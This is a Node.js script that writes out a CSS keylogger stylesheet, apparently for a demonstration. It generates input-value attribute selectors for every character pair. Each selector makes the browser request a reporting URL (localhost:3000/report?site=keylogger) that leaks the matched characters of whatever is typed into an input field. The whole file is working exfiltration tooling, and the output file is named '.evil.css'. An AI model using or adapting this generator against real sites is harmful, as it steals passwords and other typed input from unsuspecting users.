const fs = require("fs");
const genAllCharPairs = function (chars) {
    let res = [];
    const dfs = function (curArr) {
        if (curArr.length === 2) {
            res.push(Array.from(curArr));
        } else {
            for (let c of chars) {
                curArr.push(c);
                dfs(curArr);
                curArr.pop();
            }
        }
    };
    dfs([], {});
    return res.map(item => item.join(''));
};

function genCSS(pairs, headCSS, prefix = "_") {
    let outString = headCSS;
    for (let pair of pairs) {
        if (pair.indexOf("_") < 0) {
            if (isNaN(+pair[0])) {
                outString += `input[value*="${pair}"] ~ #${prefix}${pair} {color: var(--hightlight);background: url("http://localhost:3000/report?site=keylogger&payload=${pair}");}\n`
            } else {
                // CSS do not support dom id starts with a number
                outString += `input[value*="${pair}"] ~ #${prefix}${pair} {color: var(--hightlight);background: url("http://localhost:3000/report?site=keylogger&payload=${pair}");}\n`
            }
        } else {
            if (pair.indexOf("_") === 0) {
                outString += `input[value$="${pair[1]}"] ~ #${prefix}${pair} {color: var(--hightlight);background: url("http://localhost:3000/report?site=keylogger&payload=${pair}");}\n`
            } else {
                outString += `input[value^="${pair[0]}"] ~ #${prefix}${pair} {color: var(--hightlight);background: url("http://localhost:3000/report?site=keylogger&payload=${pair}");}\n`
            }
        }
    }

    let fileId = allChars.length > 6 ? allChars.substring(0, 6) + "*" : allChars;
    fs.writeFileSync(`keylogger.${fileId}.evil.css`, outString);
}

let allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_";
allChars = "1234567890_";
allChars = "abc_";
const staticHeadCSS = `
body::before {
    content: "You loaded keylogger.${allChars}.evil.css!";
    position: fixed;
    top: 0;
    left: 0;
    font-size: 12px;
    font-family: "Courier New", serif;
    background-color: rgba(255, 12, 82, 0.75);
    width: 100%;
    text-align: center;
    color: white;
    z-index: 999;
}

:root {
    --hightlight: #ff0c52
}`;
let allPairs = genAllCharPairs(allChars);
genCSS(allPairs, staticHeadCSS);

